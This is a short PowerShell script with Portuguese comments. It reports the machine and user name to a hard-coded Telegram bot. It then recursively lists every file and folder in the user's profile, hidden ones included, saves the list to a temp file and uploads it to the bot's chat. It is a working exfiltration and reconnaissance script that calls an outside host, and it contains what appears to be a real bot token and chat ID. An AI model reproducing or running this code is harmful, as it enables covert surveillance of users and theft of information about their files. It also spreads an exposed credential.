#2

$ComputerName = $env:COMPUTERNAME
$UserName = $env:USERNAME
$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId = "5757392163"

$msg = "A executar script em $ComputerName - $UserName"
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
        -Method Post `
        -ContentType "application/json" `
        -Body (@{ chat_id = $chatId; text = $msg } | ConvertTo-Json)


# Diretório do utilizador que está a correr o script
$diretorio = [Environment]::GetFolderPath("UserProfile")

# Gera listagem completa (ficheiros + pastas) com tamanho e data
$listagem = Get-ChildItem -Recurse -Force -Path $diretorio |
    Select-Object FullName,
                  @{Name="Tamanho(KB)"; Expression={[math]::Round($_.Length / 1KB, 2)}},
                  @{Name="DataModificacao"; Expression={$_.LastWriteTime}} |
    Out-String

# --- CONFIGURAÇÕES DO TELEGRAM ---
# Substitua com o seu token e chat_id
$botToken = "$token"
$chatId   = "$chatId"

# Guardar sempre em ficheiro
$ficheiroSaida = "$env:TEMP\listagem_usuario.txt"
$listagem | Out-File -FilePath $ficheiroSaida -Encoding UTF8

# Enviar ficheiro pelo Telegram
$url = "https://api.telegram.org/bot$botToken/sendDocument"
$form = @{
    chat_id = $chatId
    document = Get-Item $ficheiroSaida
}
Invoke-RestMethod -Uri $url -Method Post -Form $form




        exit
